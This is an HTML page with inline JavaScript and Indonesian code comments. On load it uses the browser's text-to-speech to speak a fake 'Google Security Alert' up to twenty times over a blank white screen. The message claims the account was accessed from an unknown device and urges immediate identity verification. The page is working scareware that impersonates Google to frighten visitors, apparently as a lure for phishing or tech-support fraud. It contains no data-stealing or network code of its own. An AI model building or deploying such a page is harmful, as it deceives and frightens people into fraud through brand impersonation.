<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; min-height: 100vh; overflow: hidden; }
  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
</style>
</head>
<body>
<script>
(function () {
  'use strict';

  // ============================================
  // KONFIGURASI TTS (TIDAK BERUBAH)
  // ============================================
  var CONFIG = {
    tts: {
      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
      lang: 'en-US',
      rate: 0.85,
      pitch: 1.0,
      volume: 1.0,
      repeatInterval: 8000,
      maxRepeats: 20
    }
  };

  var state = { ttsStarted: false, ttsCount: 0 };

  // ============================================
  // TTS — LOGIKA ASLI DIPERTAHANKAN PENUH
  // ============================================
  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;

    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.volume = CONFIG.tts.volume;

      var voices = window.speechSynthesis.getVoices();
      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
      if (enVoice) u.voice = enVoice;

      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
      u.onend = function () {
        state.ttsCount++;
        if (state.ttsCount < CONFIG.tts.maxRepeats) {
          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
        }
      };

      window.speechSynthesis.speak(u);
    } catch (e) { console.log('[TTS] fail:', e.message); }
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  // ============================================
  // EKSEKUSI (HANYA TTS)
  // ============================================
  setTimeout(function () {
    startTTS();
  }, 100);

  setTimeout(function () {
    if (!state.ttsStarted) startTTS();
  }, 1500);

  // Visibility change (hanya memicu TTS jika belum berjalan)
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden && !state.ttsStarted) {
      setTimeout(startTTS, 100);
    }
  });
})();
</script>
</body>
</html>
